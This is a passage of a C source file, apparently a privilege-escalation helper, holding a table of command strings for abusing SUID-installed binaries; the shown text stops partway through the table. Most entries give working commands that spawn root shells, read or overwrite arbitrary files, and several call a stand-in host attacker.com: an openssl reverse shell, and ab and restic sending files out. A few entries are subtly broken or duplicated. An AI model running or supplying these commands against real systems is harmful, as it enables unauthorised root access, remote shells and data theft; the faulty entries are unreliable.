#include <stdio.h>
#include <string.h>
#include <stdlib.h>

#define PATHS 100
#define LENGTH 256
#define COMMANDS 214

typedef struct {
    char* keyword;
    char* command;
} Structure;

Structure command_list[COMMANDS] = {
    {"aa-exec",
        "aa-exec:\n"
    "    sudo install -m =xs $(which aa-exec) .\n"
    "    ./aa-exec /bin/sh -p\n"
    },

    {"ab",
        "ab:\n"
    "    sudo install -m =xs $(which ab) .\n"
    "    URL=http://attacker.com/\n"
    "    LFILE=file_to_send\n"
    "    ./ab -p $LFILE $URL\n"
    },

    {"agetty",
        "agetty:\n"
    "    sudo install -m =xs $(which agetty) .\n"
    "    ./agetty -o -p -l /bin/sh -a root tty\n"
    },

    {"alpine",
        "alpine:\n"
    "    sudo install -m =xs $(which alpine) .\n"
    "    LFILE=file_to_read\n"
    "    ./alpine -F \"$LFILE\"\n"
    },

    {"ar",
        "ar:\n"
    "    sudo install -m =xs $(which ar) .\n"
    "    TF=$(mktemp -u)\n"
    "    LFILE=file_to_read\n"
    "    ./ar r \"$TF\" \"$LFILE\"\n"
    "    cat \"$TF\"\n"
    },

    {"arj",
        "arj:\n"
    "    sudo install -m =xs $(which arj) .\n"
    "    TF=$(mktemp -d)\n"
    "    LFILE=file_to_write\n"
    "    LDIR=where_to_write\n"
    "    echo DATA >\"$TF/$LFILE\"\n"
    "    arj a \"$TF/a\" \"$TF/$LFILE\"\n"
    "    ./arj e \"$TF/a\" $LDIR\n"
    },

    {"arp",
        "arp:\n"
     "    sudo install -m =xs $(which arp) .\n"
     "    LFILE=file_to_read\n"
     "    ./arp -v -f \"$LFILE\"\n"
    },

    {"as",
        "as:\n"
    "    sudo install -m =xs $(which as) .\n"
    "    LFILE=file_to_read\n"
    "    ./as @$LFILE\n"
    },

    {"ascii-xfr",
        "ascii-xfr:\n"
    "    sudo install -m =xs $(which ascii-xfr) .\n"
    "    LFILE=file_to_read\n"
    "    ./ascii-xfr -ns \"$LFILE\"\n"
    },

    {"ash",
        "ash:\n"
    "    sudo install -m =xs $(which ash) .\n"
    "    ./ash\n"
    },

    {"aspell",
        "aspell:\n"
    "    sudo install -m =xs $(which aspell) .\n"
    "    LFILE=file_to_read\n"
    "    ./aspell -c \"$LFILE\"\n"
    },

    {"atobm",
        "atobm:\n"
   "    sudo install -m =xs $(which atobm) .\n"
   "    LFILE=file_to_read\n"
   "    ./atobm $LFILE 2>&1 | awk -F \"'\" '{printf \"%s\", $2}'\n"
    },

    {"awk",
        "awk:\n"
    "    sudo install -m =xs $(which awk) .\n"
    "    LFILE=file_to_read\n"
    "    ./awk '//' \"$LFILE\"\n"
    },

    {"base32",
        "base32:\n"
    "    sudo install -m =xs $(which base32) .\n"
    "    LFILE=file_to_read\n"
    "    base32 \"$LFILE\" | base32 --decode\n"
    },

    {"base64",
        "base64:\n"
    "    sudo install -m =xs $(which base64) .\n"
    "    LFILE=file_to_read\n"
    "    ./base64 \"$LFILE\" | base64 --decode\n"
    },

    {"basenc",
        "basenc:\n"
    "    sudo install -m =xs $(which basenc) .\n"
    "    LFILE=file_to_read\n"
    "    basenc --base64 $LFILE | basenc -d --base\n"
    },

    {"basez",
        "basez:\n"
    "    sudo install -m =xs $(which basez) .\n"
    "    LFILE=file_to_read\n"
    "    ./basez \"$LFILE\" | basez --decode\n"
    },

    {"bash",
        "bash:\n"
    "    sudo install -m =xs $(which bash) .\n"
    "    ./bash -p\n"
    },

    {"bc",
        "bc:\n"
    "    sudo install -m =xs $(which bc) .\n"
    "    LFILE=file_to_read\n"
    "    ./bc -s $LFILE\n"
    "    quit\n"
    },

    {"bridge",
        "bridge:\n"
    "    sudo install -m =xs $(which bridge) .\n"
    "    LFILE=file_to_read\n"
    "    ./bridge -b \"$LFILE\"\n"
    },

    {"busctl",
        "busctl:\n"
    "    sudo install -m =xs $(which busctl) .\n"
    "    ./busctl set-property org.freedesktop.systemd1 /org/freedesktop/systemd1 org.freedesktop.systemd1.Manager LogLevel s debug --address=unixexec:path=/bin/sh,argv1=-pc,argv2='/bin/sh -p -i 0<&2 1>&2'\n"
    },

    {"busybox",
        "busybox:\n"
    "    sudo install -m =xs $(which busybox) .\n"
    "    ./busybox sh\n"
    },

    {"bzip2",
        "bzip2:\n"
    "    sudo install -m =xs $(which bzip2) .\n"
    "    LFILE=file_to_read\n"
    "    ./bzip2 -c $LFILE | bzip2 -d\n"
    },

    {"cabal",
        "cabal:\n"
    "    sudo install -m =xs $(which cabal) .\n"
    "    ./cabal exec -- /bin/sh -p\n"
    },

    {"capsh",
        "capsh:\n"
    "    sudo install -m =xs $(which capsh) .\n"
    "    ./capsh --gid=0 --uid=0 --\n"
    },

    {"cat",
        "cat:\n"
    "    sudo install -m =xs $(which cat) .\n"
    "    LFILE=file_to_read\n"
    "    ./cat \"$LFILE\"\n"
    },

    {"chmod",
        "chmod:\n"
    "    sudo install -m =xs $(which chmod) .\n"
    "    LFILE=file_to_change\n"
    "    ./chmod 6777 $LFILE\n"
    },

    {"choom",
        "choom:\n"
    "    sudo install -m =xs $(which choom) .\n"
    "    ./choom -n 0 -- /bin/sh -p\n"
    },

    {"chown",
        "chown:\n"
    "    sudo install -m =xs $(which chown) .\n"
    "    LFILE=file_to_change\n"
    "    ./chown $(id -un):$(id -gn) $LFILE\n"
    },

    {"chroot",
        "chroot:\n"
    "    sudo install -m =xs $(which chroot) .\n"
    "    ./chroot / /bin/sh -p\n"
    },

    {"clamscan",
        "clamscan:\n"
    "    sudo install -m =xs $(which clamscan) .\n"
    "    LFILE=file_to_read\n"
    "    TF=$(mktemp -d)\n"
    "    touch $TF/empty.yara\n"
    "    ./clamscan --no-summary -d $TF -f $LFILE 2>&1 | sed -nE 's/^(.*): No such file or directory$/\\1/p'\n"
    },

    {"cmp",
        "cmp:\n"
    "    sudo install -m =xs $(which cmp) .\n"
    "    LFILE=file_to_read\n"
    "    ./cmp $LFILE /dev/zero -b -l\n"
    },

    {"column",
        "column:\n"
    "    sudo install -m =xs $(which column) .\n"
    "    LFILE=file_to_read\n"
    "    ./column $LFILE\n"
    },

    {"comm",
        "comm:\n"
    "    sudo install -m =xs $(which comm) .\n"
    "    LFILE=file_to_read\n"
    "    comm $LFILE /dev/null 2>/dev/null\n"
    },

    {"cp",
        "cp:\n"
    "    1. sudo install -m =xs $(which cp) .\n"
    "       LFILE=file_to_write\n"
    "       echo \"DATA\" | ./cp /dev/stdin \"$LFILE\"\n"
    "    2. sudo install -m =xs $(which cp) .\n"
    "       LFILE=file_to_write\n"
    "       echo \"DATA\" | ./cp /dev/stdin \"$LFILE\"\n"
    "    3. sudo install -m =xs $(which cp) .\n"
    "       LFILE=file_to_change\n"
    "       ./cp --attributes-only --preserve=all ./cp \"$LFILE\"\n"
    },

    {"cpio",
        "cpio:\n"
    "    1. sudo install -m =xs $(which cpio) .\n"
    "       LFILE=file_to_read\n"
    "       TF=$(mktemp -d)\n"
    "       echo \"$LFILE\" | ./cpio -R $UID -dp $TF\n"
    "       cat \"$TF/$LFILE\"\n"
    "    2. sudo install -m =xs $(which cpio) .\n"
    "       LFILE=file_to_write\n"
    "       LDIR=where_to_write\n"
    "       echo DATA >$LFILE\n"
    "       echo $LFILE | ./cpio -R 0:0 -p $LDIR\n"
    },

    {"cpulimit",
        "cpulimit:\n"
    "    sudo install -m =xs $(which cpulimit) .\n"
    "    ./cpulimit -l 100 -f -- /bin/sh -p\n"
    },

    {"csh",
        "csh:\n"
    "    sudo install -m =xs $(which csh) .\n"
    "    ./csh -b\n"
    },

    {"csplit",
        "csplit:\n"
    "    sudo install -m =xs $(which csplit) .\n"
    "    LFILE=file_to_read\n"
    "    csplit $LFILE 1\n"
    "    cat xx01\n"
    },

    {"csvtool",
        "csvtool:\n"
    "    sudo install -m =xs $(which csvtool) .\n"
    "    LFILE=file_to_read\n"
    "    ./csvtool trim t $LFILE\n"
    },

    {"cupsfilter",
        "cupsfilter\n"
    "   sudo install -m =xs $(which cupsfilter) .\n"
    "   LFILE=file_to_read\n"
    "   ./cupsfilter -i application/octet-stream -m application/octet-stream $LFILE\n"
    },

    {"curl",
        "curl:\n"
    "    sudo install -m =xs $(which curl) .\n"
    "    URL=http://attacker.com/file_to_get\n"
    "    LFILE=file_to_save\n"
    "    ./curl $URL -o $LFILE\n"
    },

    {"cut",
        "cut:\n"
    "    sudo install -m =xs $(which cut) .\n"
    "    LFILE=file_to_read\n"
    "    ./cut\n"
    },

    {"dash",
        "dash:\n"
    "    sudo install -m =xs $(which dash) .\n"
    "    ./dash -p\n"
    },

    {"date",
        "date:\n"
    "    sudo install -m =xs $(which date) .\n"
    "    LFILE=file_to_read\n"
    "    ./date -f $LFILE\n"
    },

    {"dd",
        "dd:\n"
    "    sudo install -m =xs $(which dd) .\n"
    "    LFILE=file_to_write\n"
    "    echo \"data\" | ./dd of=$LFILE\n"
    },

    {"debugfs",
        "debugfs:\n"
    "    sudo install -m =xs $(which debugfs) .\n"
    "    ./debugfs\n"
    "    !/bin/sh\n"
    },

    {"dialog",
        "dialog:\n"
    "    sudo install -m =xs $(which dialog) .\n"
    "    LFILE=file_to_read\n"
    "    ./dialog --textbox \"$LFILE\" 0 0\n"
    },

    {"diff",
        "diff:\n"
    "    sudo install -m =xs $(which diff) .\n"
    "    LFILE=file_to_read\n"
    "    ./diff --line-format=%L /dev/null $LFILE\n"
    },

    {"dig",
        "dig:\n"
    "    sudo install -m =xs $(which dig) .\n"
    "    LFILE=file_to_read\n"
    "    ./dig -f $LFILE\n"
    },

    {"distcc",
        "distcc:\n"
    "    sudo install -m =xs $(which distcc) .\n"
    "    ./distcc /bin/sh -p\n"
    },

    {"dmsetup",
        "dmsetup:\n"
    "    sudo install -m =xs $(which dmsetup) .\n"
    "    ./dmsetup create base <<EOF\n"
    "    0 3534848 linear /dev/loop0 94208\n"
    "    EOF\n"
    "    ./dmsetup ls --exec '/bin/sh -p -s'\n"
    },

    {"docker",
        "docker:\n"
    "    sudo install -m =xs $(which docker) .\n"
    "    ./docker run -v /:/mnt --rm -it alpine chroot /mnt sh\n"
    },

    {"dosbox",
        "dosbox:\n"
    "    sudo install -m =xs $(which dosbox) .\n"
    "    LFILE='\\\\path\\\\to\\\\file_to_write'\n"
    "    ./dosbox -c 'mount c /' -c \"echo DATA >c:$LFILE\" -c exit\n"
    },

    {"ed",
        "ed:\n"
    "    sudo install -m =xs $(which ed) .\n"
    "    ./ed file_to_read\n"
    "    ,p\n"
    "    q\n"
    },

    {"efax",
        "efax:\n"
    "    sudo install -m =xs $(which efax) .\n"
    "    LFILE=file_to_read\n"
    "    ./efax -d \"$LFILE\"\n"
    },

    {"elvish",
        "elvish:\n"
    "    sudo install -m =xs $(which elvish) .\n"
    "    ./elvish\n"
    },

    {"emacs",
        "emacs:\n"
    "    sudo install -m =xs $(which emacs) .\n"
    "    ./emacs -Q -nw --eval '(term \"/bin/sh -p\")'\n"
    },

    {"env",
        "env:\n"
    "    sudo install -m =xs $(which env) .\n"
    "    ./env /bin/sh -p\n"
    },

    {"eqn",
        "eqn:\n"
    "    sudo install -m =xs $(which eqn) .\n"
    "    LFILE=file_to_read\n"
    "    ./eqn \"$LFILE\"\n"
    },

    {"espeak",
        "espeak:\n"
    "    sudo install -m =xs $(which espeak) .\n"
    "    LFILE=file_to_read\n"
    "    ./espeak -qXf \"$LFILE\"\n"
    },

    {"expand",
        "expand:\n"
    "    sudo install -m =xs $(which expand) .\n"
    "    LFILE=file_to_read\n"
    "    ./expand \"$LFILE\"\n"
    },

    {"expect",
        "expect:\n"
    "    sudo install -m =xs $(which expect) .\n"
    "    ./expect -c 'spawn /bin/sh -p;interact'\n"
    },

    {"file",
        "file:\n"
    "    sudo install -m =xs $(which file) .\n"
    "    LFILE=file_to_read\n"
    "    ./file -f $LFILE\n"
    },

    {"find",
        "find:\n"
    "    sudo install -m =xs $(which find) .\n"
    "    ./find . -exec /bin/sh -p \\; -quit\n"
    },

    {"fish",
        "fish:\n"
    "    sudo install -m =xs $(which fish) .\n"
    "    ./fish\n"
    },

    {"flock",
        "flock:\n"
    "    sudo install -m =xs $(which flock) .\n"
    "    ./flock -u / /bin/sh -p\n"
    },

    {"fmt",
        "fmt:\n"
    "    sudo install -m =xs $(which fmt) .\n"
    "    LFILE=file_to_read\n"
    "    ./fmt -999 \"$LFILE\"\n"
    },

    {"fold",
        "fold:\n"
    "    sudo install -m =xs $(which fold) .\n"
    "    LFILE=file_to_read\n"
    "    ./fold -w99999999 \"$LFILE\"\n"
    },

    {"gawk",
        "gawk:\n"
    "    sudo install -m =xs $(which gawk) .\n"
    "    LFILE=file_to_read\n"
    "    ./gawk '//' \"$LFILE\"\n"
    },

    {"gcore",
        "gcore:\n"
    "    sudo install -m =xs $(which gcore) .\n"
    "    ./gcore $PID\n"
    },

    {"gdb",
        "gdb:\n"
    "    sudo install -m =xs $(which gdb) .\n"
    "    ./gdb -nx -ex 'python import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")' -ex quit\n"
    },

    {"genie",
        "genie:\n"
    "    sudo install -m =xs $(which genie) .\n"
    "    ./genie -c '/bin/sh'\n"
    },

    {"genisoimage",
        "genisoimage:\n"
    "    sudo install -m =xs $(which genisoimage) .\n"
    "    LFILE=file_to_read\n"
    "    ./genisoimage -sort \"$LFILE\"\n"
    },

    {"gimp",
        "gimp:\n"
    "    sudo install -m =xs $(which gimp) .\n"
    "    ./gimp -idf --batch-interpreter=python-fu-eval -b 'import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")'\n"
    },

    {"grep",
        "grep:\n"
    "    sudo install -m =xs $(which grep) .\n"
    "    LFILE=file_to_read\n"
    "    ./grep '' $LFILE\n"
    },

    {"gtester",
        "gtester:\n"
    "    sudo install -m =xs $(which gtester) .\n"
    "    TF=$(mktemp)\n"
    "    echo '#!/bin/sh -p' > $TF\n"
    "    echo 'exec /bin/sh -p 0<&1' >> $TF\n"
    "    chmod +x $TF\n"
    "    sudo gtester -q $TF\n"
    },

    {"gzip",
        "gzip:\n"
    "    sudo install -m =xs $(which gzip) .\n"
    "    LFILE=file_to_read\n"
    "    ./gzip -f $LFILE -t\n"
    },

    {"hd",
        "hd:\n"
    "    sudo install -m =xs $(which hd) .\n"
    "    LFILE=file_to_read\n"
    "    ./hd \"$LFILE\"\n"
    },

    {"head",
        "head:\n"
    "    sudo install -m =xs $(which head) .\n"
    "    LFILE=file_to_read\n"
    "    ./head -c1G \"$LFILE\"\n"
    },

    {"hexdump",
        "hexdump:\n"
    "    sudo install -m =xs $(which hexdump) .\n"
    "    LFILE=file_to_read\n"
    "    ./hexdump -C \"$LFILE\"\n"
    },

    {"highlight",
        "highlight:\n"
    "    sudo install -m =xs $(which highlight) .\n"
    "    LFILE=file_to_read\n"
    "    ./highlight --no-doc --failsafe \"$LFILE\"\n"
    },

    {"hping3",
        "hping3:\n"
    "    sudo install -m =xs $(which hping3) .\n"
    "    ./hping3\n"
    "    /bin/sh -p\n"
    },

    {"iconv",
        "iconv:\n"
    "    sudo install -m =xs $(which iconv) .\n"
    "    LFILE=file_to_read\n"
    "    ./iconv -f 8859_1 -t 8859_1 \"$LFILE\"\n"
    },

    {"install",
        "install:\n"
    "    sudo install -m =xs $(which install) .\n"
    "    LFILE=file_to_change\n"
    "    TF=$(mktemp)\n"
    "    ./install -m 6777 $LFILE $TF\n"
    },

    {"ionice",
        "ionice:\n"
    "    sudo install -m =xs $(which ionice) .\n"
    "    ./ionice /bin/sh -p\n"
    },

    {"ip",
        "ip:\n"
     "    1. sudo install -m =xs $(which ip) .\n"
     "       LFILE=file_to_read\n"
     "       ./ip -force -batch \"$LFILE\"\n"
     "    2. sudo install -m =xs $(which ip) .\n"
     "       ./ip netns add foo\n"
     "       ./ip netns exec foo /bin/sh -p\n"
     "       ./ip netns delete foo\n"
    },

    {"ispell",
        "ispell:\n"
    "    sudo install -m =xs $(which ispell) .\n"
    "    ./ispell /etc/passwd\n"
    "    !/bin/sh -p\n"
    },

    {"jjs",
        "jjs:\n"
    "    sudo install -m =xs $(which jjs) .\n"
    "    echo \"Java.type('java.lang.Runtime').getRuntime().exec('/bin/sh -pc $@|sh${IFS}-p _ echo sh -p <$(tty) >$(tty) 2>$(tty)').waitFor()\" | ./jjs\n"
    },

    {"join",
        "join:\n"
    "    sudo install -m =xs $(which join) .\n"
    "    LFILE=file_to_read\n"
    "    ./join -a 2 /dev/null $LFILE\n"
    },

    {"jq",
        "jq:\n"
    "    sudo install -m =xs $(which jq) .\n"
    "    LFILE=file_to_read\n"
    "    ./jq -Rr . \"$LFILE\"\n"
    },

    {"jrunscript",
        "jrunscript:\n"
    "    sudo install -m =xs $(which jrunscript) .\n"
    "    ./jrunscript -e \"exec('/bin/sh -pc $@|sh${IFS}-p _ echo sh -p <$(tty) >$(tty) 2>$(tty)')\"\n"
    },

    {"julia",
        "julia:\n"
    "    sudo install -m =xs $(which julia) .\n"
    "    ./julia -e 'run(`/bin/sh -p`)'\n"
    },

    {"ksh",
        "ksh:\n"
    "    sudo install -m =xs $(which ksh) .\n"
    "    ./ksh -p\n"
    },

    {"ksshell",
        "ksshell:\n"
    "    sudo install -m =xs $(which ksshell) .\n"
    "    LFILE=file_to_read\n"
    "    ./ksshell -i $LFILE\n"
    },

    {"kubectl",
        "kubectl:\n"
    "    sudo install -m =xs $(which kubectl) .\n"
    "    LFILE=dir_to_serve\n"
    "    ./kubectl proxy --address=0.0.0.0 --port=4444 --www=$LFILE --www-prefix=/x/\n"
    },

    {"ld.so",
        "ld.so:\n"
    "    sudo install -m =xs $(which ld.so) .\n"
    "    ./ld.so /bin/sh -p\n"
    },

    {"less",
        "less:\n"
    "    sudo install -m =xs $(which less) .\n"
    "    ./less file_to_read\n"
    },

    {"links",
        "links:\n"
    "    sudo install -m =xs $(which links) .\n"
    "    LFILE=file_to_read\n"
    "    ./links \"$LFILE\"\n"
    },

    {"logsave",
        "logsave:\n"
    "    sudo install -m =xs $(which logsave) .\n"
    "    ./logsave /dev/null /bin/sh -i -p\n"
    },

    {"look",
        "look:\n"
    "    sudo install -m =xs $(which look) .\n"
    "    LFILE=file_to_read\n"
    "    ./look '' \"$LFILE\"\n"
    },

    {"lua",
        "lua:\n"
    "    sudo install -m =xs $(which lua) .\n"
    "    lua -e 'local f=io.open(\"file_to_read\", \"rb\"); print(f:read(\"*a\")); io.close(f);'\n"
    },

    {"make",
        "make:\n"
    "    sudo install -m =xs $(which make) .\n"
    "    COMMAND='/bin/sh -p'\n"
    "    ./make -s --eval=$'x:\\n\\t-\"$COMMAND\"\n"
    },

    {"mawk",
        "mawk:\n"
    "    sudo install -m =xs $(which mawk) .\n"
    "    LFILE=file_to_read\n"
    "    ./mawk '//' \"$LFILE\"\n"
    },

    {"minicom",
        "minicom:\n"
    "    sudo install -m =xs $(which minicom) .\n"
    "    ./minicom -D /dev/nul\n"
    },

    {"more",
        "more:\n"
    "    sudo install -m =xs $(which more) .\n"
    "    ./more file_to_read\n"
    },

    {"mosquitto",
        "mosquitto:\n"
    "    sudo install -m =xs $(which mosquitto) .\n"
    "    LFILE=file_to_read\n"
    "    ./mosquitto -c \"$LFILE\"\n"
    },

    {"msgattrib",
        "msgattrib:\n"
    "    sudo install -m =xs $(which msgattrib) .\n"
    "    LFILE=file_to_read\n"
    "    ./msgattrib -P $LFILE\n"
    },

    {"msgcat",
        "msgcat:\n"
    "    sudo install -m =xs $(which msgcat) .\n"
    "    LFILE=file_to_read\n"
    "    ./msgcat -P $LFILE\n"
    },

    {"msgconv",
        "msgconv:\n"
    "    sudo install -m =xs $(which msgconv) .\n"
    "    LFILE=file_to_read\n"
    "    ./msgconv -P $LFILE\n"
    },

    {"msgfilter",
        "msgfilter:\n"
    "    sudo install -m =xs $(which msgfilter) .\n"
    "    echo x | ./msgfilter -P /bin/sh -p -c '/bin/sh -p 0<&2 1>&2; kill $PPID'\n"
    },

    {"msgmerge",
        "msgmerge:\n"
    "    sudo install -m =xs $(which msgmerge) .\n"
    "    LFILE=file_to_read\n"
    "    ./msgmerge -P $LFILE /dev/null\n"
    },

    {"msguniq",
        "msguniq:\n"
    "    sudo install -m =xs $(which msguniq) .\n"
    "    LFILE=file_to_read\n"
    "    ./msguniq -P $LFILE\n"
    },

    {"multitime",
        "multitime:\n"
    "    sudo install -m =xs $(which multitime) .\n"
    "    ./multitime /bin/sh -p\n"
    },

    {"mv",
        "mv:\n"
    "    sudo install -m =xs $(which mv) .\n"
    "    LFILE=file_to_write\n"
    "    TF=$(mktemp)\n"
    "    echo \"DATA\" > $TF\n"
    "    ./mv $TF $LFILE\n"
    },

    {"nasm",
        "nasm:\n"
    "    sudo install -m =xs $(which nasm) .\n"
    "    LFILE=file_to_read\n"
    "    ./nasm -@ $LFILE\n"
    },

    {"nawk",
        "nawk:\n"
    "    sudo install -m =xs $(which nawk) .\n"
    "    LFILE=file_to_read\n"
    "    ./nawk '//' \"$LFILE\"\n"
    },

    {"ncftp",
        "ncftp:\n"
    "    sudo install -m =xs $(which ncftp) .\n"
    "    ./ncftp\n"
    "    !/bin/sh -p\n"
    },

    {"nft",
        "nft:\n"
    "    sudo install -m =xs $(which nft) .\n"
    "    LFILE=file_to_read\n"
    "    ./nft -f \"$LFILE\"\n"
    },

    {"nice",
        "nice:\n"
    "    sudo install -m =xs $(which nice) .\n"
    "    ./nice /bin/sh -p\n"
    },

    {"nl",
        "nl:\n"
    "    sudo install -m =xs $(which nl) .\n"
    "    LFILE=file_to_read\n"
    "    ./nl -bn -w1 -s '' $LFILE\n"
    },

    {"nm",
        "nm:\n"
    "    sudo install -m =xs $(which nm) .\n"
    "    LFILE=file_to_read\n"
    "    ./nm @$LFILE\n"
    },

    {"nmap",
        "nmap:\n"
    "    sudo install -m =xs $(which nmap) .\n"
    "    LFILE=file_to_write\n"
    "    ./nmap -oG=$LFILE DATA\n"
    },

    {"node",
        "node:\n"
    "    sudo install -m =xs $(which node) .\n"
    "    ./node -e 'require(\"child_process\").spawn(\"/bin/sh\", [\"-p\"], {stdio: [0, 1, 2]})'\n"
    },

    {"nohup",
        "nohup:\n"
    "    sudo install -m =xs $(which nohup) .\n"
    "    ./nohup /bin/sh -p -c \"sh -p <$(tty) >$(tty) 2>$(tty)\"\n"
    },

    {"ntpdate",
        "ntpdate:\n"
    "    sudo install -m =xs $(which ntpdate) .\n"
    "    LFILE=file_to_read\n"
    "    ./ntpdate -a x -k $LFILE -d localhost\n"
    },

    {"od",
        "od:\n"
    "    sudo install -m =xs $(which od) .\n"
    "    LFILE=file_to_read\n"
    "    ./od -An -c -w9999 \"$LFILE\"\n"
    },

    {"openssl",
        "openssl:\n"
    "    1. To receive the shell run the following on the attacker box:\n"
    "       openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes\n"
    "       openssl s_server -quiet -key key.pem -cert cert.pem -port 12345\n"
    "       Communication between attacker and target will be encrypted\n"
    "\n"
    "    sudo install -m =xs $(which openssl) .\n"
    "    RHOST=attacker.com\n"
    "    RPORT=12345\n"
    "    mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | ./openssl s_client -quiet -connect $RHOST:$RPORT > /tmp/s; rm /tmp/s\n"
    "\n"
    "    2.\n"
    "    sudo install -m =xs $(which openssl) .\n"
    "    LFILE=file_to_write\n"
    "    echo DATA | openssl enc -out \"$LFILE\"\n"
    },

    {"openvpn",
        "openvpn:\n"
    "    1.\n"
    "    sudo install -m =xs $(which openvpn) .\n"
    "    ./openvpn --dev null --script-security 2 --up '/bin/sh -p -c \"sh -p\"'\n"
    "\n"
    "    2.\n"
    "    sudo install -m =xs $(which openvpn) .\n"
    "    LFILE=file_to_read\n"
    "    ./openvpn --config \"$LFILE\"\n"
    },

    {"pandoc",
        "pandoc:\n"
    "    sudo install -m =xs $(which pandoc) .\n"
    "    LFILE=file_to_write\n"
    "    echo DATA | ./pandoc -t plain -o \"$LFILE\"\n"
    },

    {"paste",
        "paste:\n"
    "    sudo install -m =xs $(which paste) .\n"
    "    LFILE=file_to_read\n"
    "    paste $LFILE\n"
    },

    {"perf",
        "perf:\n"
    "    sudo install -m =xs $(which perf) .\n"
    "    ./perf stat /bin/sh -p\n"
    },

    {"perl",
        "perl:\n"
    "    sudo install -m =xs $(which perl) .\n"
    "    ./perl -e 'exec \"/bin/sh\";'\n"
    },

    {"pexec",
        "pexec:\n"
    "    sudo install -m =xs $(which perl) .\n"
    "    ./perl -e 'exec \"/bin/sh\";'\n"
    },

    {"pg",
        "pg:\n"
    "    sudo install -m =xs $(which pg) .\n"
    "    ./pg file_to_read\n"
    },

    {"php",
        "php:\n"
    "    sudo install -m =xs $(which php) .\n"
    "    CMD=\"/bin/sh\"\n"
    "    ./php -r \"pcntl_exec('/bin/sh', ['-p']);\"\n"
    },

    {"pidstat",
        "pidstat:\n"
    "    sudo install -m =xs $(which pidstat) .\n"
    "    COMMAND=id\n"
    "    ./pidstat -e $COMMAND\n"
    },

    {"pr",
        "pr:\n"
     "    sudo install -m =xs $(which pr) .\n"
     "    LFILE=file_to_read\n"
     "    pr -T $LFILE\n"
    },

    {"ptx",
        "ptx:\n"
    "    sudo install -m =xs $(which ptx) .\n"
    "    LFILE=file_to_read\n"
    "    ./ptx -w 5000 \"$LFILE\"\n"
    },

    {"python",
        "python:\n"
    "    sudo install -m =xs $(which python) .\n"
    "    ./python -c 'import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")'\n"
    },

    {"rc",
        "rc:\n"
    "    sudo install -m =xs $(which rc) .\n"
    "    ./rc -c '/bin/sh -p'\n"
    },

    {"readelf",
        "readelf:\n"
    "    sudo install -m =xs $(which readelf) .\n"
    "    LFILE=file_to_read\n"
    "    ./readelf -a @$LFILE\n"
    },

    {"restic",
        "restic:\n"
    "    sudo install -m =xs $(which restic) .\n"
    "    RHOST=attacker.com\n"
    "    RPORT=12345\n"
    "    LFILE=file_or_dir_to_get\n"
    "    NAME=backup_name\n"
    "    ./restic backup -r \"rest:http://$RHOST:$RPORT/$NAME\" \"$LFILE\"\n"
    },

    {"rev",
        "rev:\n"
    "    sudo install -m =xs $(which rev) .\n"
    "    LFILE=file_to_read\n"
    "    ./rev $LFILE | rev\n"
    },

    {"rlwrap",
        "rlwrap:\n"
    "    sudo install -m =xs $(which rlwrap) .\n"
    "    ./rlwrap -H /dev/null /bin/sh -p\n"
    },

    {"rsync",
        "rsync:\n"
    "    sudo install -m =xs $(which rsync) .\n"
    "    ./rsync -e 'sh -p -c \"sh 0<&2 1>&2\"' 127.0.0.1:/dev/null\n"
    },

    {"rtorrent",
        "rtorrent:\n"
    "    sudo install -m =xs $(which rtorrent) .\n"
    "    echo \"execute = /bin/sh,-p,-c,\"/bin/sh -p <$(tty) >$(tty) 2>$(tty)\"\" >~/.rtorrent.rc\n"
    "    ./rtorrent\n"
    },

    {"run-parts",
        "run-parts:\n"
    "    sudo install -m =xs $(which run-parts) .\n"
    "    ./run-parts --new-session --regex '^sh$' /bin --arg='-p'\n"
    },

    {"rview",
        "rview:\n"
    "    sudo install -m =xs $(which rview) .\n"
    "    ./rview -c ':py import os; os.execl(\"/bin/sh\", \"sh\", \"-pc\", \"reset; exec sh -p\")'\n"
    },

    {"rvim",
        "rvim:\n"
    "    sudo install -m =xs $(which rvim) .\n"
    "    ./rvim -c ':py import os; os.execl(\"/bin/sh\", \"sh\", \"-pc\", \"reset; exec sh -p\")'\n"
    },

    {"sash",
        "sash:\n"
    "    sudo install -m =xs $(which sash) .\n"
    "    ./sash\n"
    },

    {"scanmem",
        "scanmem:\n"
    "    sudo install -m =xs $(which scanmem) .\n"
    "    ./scanmem\n"
    "    shell /bin/sh\n"
    },

    {"sed",
        "sed:\n"
    "    sudo install -m =xs $(which sed) .\n"
    "    LFILE=file_to_read\n"
    "    ./sed -e '' \"$LFILE\"\n"
    },

    {"setarch",
        "setarch:\n"
    "    sudo install -m =xs $(which setarch) .\n"
    "    ./setarch $(arch) /bin/sh -p\n"
    },

    {"setfacl",
        "setfacl:\n"
    "    sudo install -m =xs $(which setfacl) .\n"
    "    LFILE=file_to_change\n"
    "    USER=somebody\n"
    "    ./setfacl -m u:$USER:rwx $LFILE\n"
    },

    {"setlock",
        "setlock:\n"
    "    sudo install -m =xs $(which setlock) .\n"
    "    ./setlock - /bin/sh -p\n"
    },

    {"shuf",
        "shuf:\n"
    "    sudo install -m =xs $(which shuf) .\n"
    "    LFILE=file_to_write\n"
    "    ./shuf -e DATA -o \"$LFILE\"\n"
    },

    {"soelim",
        "soelim:\n"
    "    sudo install -m =xs $(which soelim) .\n"
    "    LFILE=file_to_read\n"
    "    ./soelim \"$LFILE\"\n"
    },

    {"softlimit",
        "softlimit:\n"
    "    sudo install -m =xs $(which softlimit) .\n"
    "    ./softlimit /bin/sh -p\n"
    },

    {"sort",
        "sort:\n"
    "    sudo install -m =xs $(which sort) .\n"
    "    LFILE=file_to_read\n"
    "    ./sort -m \"$LFILE\"\n"
    },

    {"sqlite3",
        "sqlite3:\n"
    "    sudo install -m =xs $(which sqlite3) .\n"
    "    LFILE=file_to_read\n"
    "    sqlite3 << EOF\n"
    "    CREATE TABLE t(line TEXT);\n"
    "    .import $LFILE t\n"
    "    SELECT * FROM t;\n"
    "    EOF\n"
    },

    {"ss",
        "ss:\n"
    "    sudo install -m =xs $(which ss) .\n"
    "    LFILE=file_to_read\n"
    "    ./ss -a -F $LFILE\n"
    },

    {"ssh-agent",
        "ssh-agent:\n"
    "    sudo install -m =xs $(which ssh-agent) .\n"
    "    ./ssh-agent /bin/ -p\n"
    },

    {"ssh-keygen",
        "ssh-keygen:\n"
    "    sudo install -m =xs $(which ssh-keygen) .\n"
    "    ./ssh-keygen -D ./lib.so\n"
    },

    {"ssh-keyscan",
